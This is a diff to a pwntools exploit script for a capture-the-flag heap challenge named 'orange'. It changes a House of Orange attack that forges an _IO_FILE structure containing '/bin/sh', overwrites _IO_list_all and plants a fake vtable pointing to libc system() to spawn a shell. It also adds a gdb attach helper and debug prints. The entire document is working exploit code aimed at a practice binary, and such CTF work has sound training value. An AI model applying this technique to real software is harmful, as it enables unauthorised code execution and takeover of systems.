@@ -2,9 +2,16 @@ from pwn import *
 io = process('./orange')
 # io = remote('ctf.v50to.cc',10418)
 context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
-libc = ELF("/home/cc/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
+libc = ELF("/home/cc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
 context.log_level = "debug"
 def slog(name,address): io.success(name+'==>'+hex(address))
+def gdba(x=''):
+	if type(io)==pwnlib.tubes.remote.remote:
+		return
+	elif type(io)==pwnlib.tubes.process.process:
+		# gdb.attach(p,x)
+		gdb.attach(proc.pidof(io)[0],x)
+		pause()
 def build(name_length,name):
     io.recvuntil(b"Your choice : ")
     io.sendline(b'1')
@@ -71,6 +78,7 @@ write_base_offset = 0x20
 chain_offset = 0x68
 vtable_offset = 0xd8
 list_all = libc_base + libc.sym['_IO_list_all']
+sys_addr=libc_base+libc.symbols['system']
 slog("_IO_list_all",list_all)
 pl = b'a'*0x400
 pl += p64(0) + p64(0x21)
@@ -78,23 +86,27 @@ pl += p64(0)*2
 pl += b'/bin/sh\x00'+ p64(0x61)
 pl += p64(0) + p64(list_all-0x10) 
 pl += p64(0) + p64(1)       #set base = 0 ,ptr = 1
-pl += b'\x00'*0x90
-pl += p64(0)                #set mod = 0
-pl += b'\x00'*0x10
-pl += p64(heap_base + 0x5d0) #0x5d0 is the fake_vtable offset
-fake_vtable = p64(0)*3 + p64(libc_base + libc.sym['system'])
-#then the list_all will point to unsorted bin
-pl += fake_vtable
+pl += p64(0)*7
+pl += p64(heap_base + 0x4f0)
+pl += p64(0)*13 #set mod = 0
+pl += p64(heap_base + 0x5c8) #0x5d0 is the fake_vtable offset
+pl+=p64(0)+p64(0)+p64(sys_addr)
+
 print('before edit')
 print('len',len(pl))
 # pause()
 upgrade(len(pl),pl)
 # gdb.attach(proc.pidof(io)[0],'b *$rebase(0x0000000000000D68)')
 print("edited")
+print('systemaddr',hex(libc_base + libc.symbols['system']))
+print('libc_base',hex(libc_base))
+# gdba()
 pause()
 io.recvuntil(b"Your choice : ")
 io.sendline(b'1')
 print("added")
+print('systemaddr',hex(libc_base + libc.symbols['system']))
+print('libc_base',hex(libc_base))
 pause()
 
 io.interactive()
